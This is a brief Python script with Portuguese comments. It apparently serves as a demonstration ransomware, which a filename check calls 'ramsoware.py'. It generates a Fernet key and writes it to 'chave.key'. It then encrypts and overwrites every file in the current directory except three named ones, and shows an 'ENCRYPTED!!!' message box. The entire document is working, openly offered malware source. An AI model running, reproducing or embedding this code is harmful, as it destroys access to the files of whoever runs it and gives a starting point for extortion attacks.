import os   # Importação da biblioteca para automação de operações no computador.
from cryptography.fernet import Fernet   # Importação do módulo de criptografia da biblioteca cryptography.
from tkinter import messagebox   # Importação do módulo messagebox da biblioteca tkinter para exibição de mensagem ao usuário.

files = []   # Criação de uma lista para armazenamento dos arquivos a serem criptografados.
key = Fernet.generate_key()   # Geração de uma chave de criptografia.

# Criação de um arquivo para armazenamento da chave de criptografia gerada.
with open("chave.key", "wb") as chave:
    chave.write(key)

# Laço de repetição para buscar os arquivos a serem criptografados.
for file in os.listdir():
    # Verificação para garantir que alguns arquivos específicos não sejam criptografados.
    if file == "ramsoware.py" or file == "chave.key" or file == "codDecrypted.py":
        continue
    # Verificação para incluir apenas arquivos na lista.
    if os.path.isfile(file):
        files.append(file)

# Laço de repetição para criptografar os arquivos.
for file in files:
    # Abertura do arquivo em modo de leitura binária.
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    # Criptografia do conteúdo do arquivo com a chave gerada.
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    # Abertura do arquivo em modo de escrita binária para sobrescrever o arquivo original com o arquivo criptografado.
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)

# Exibição de uma mensagem informando que o processo de criptografia foi concluído.
messagebox.showinfo("Carregando....","ENCRYPTED!!!")
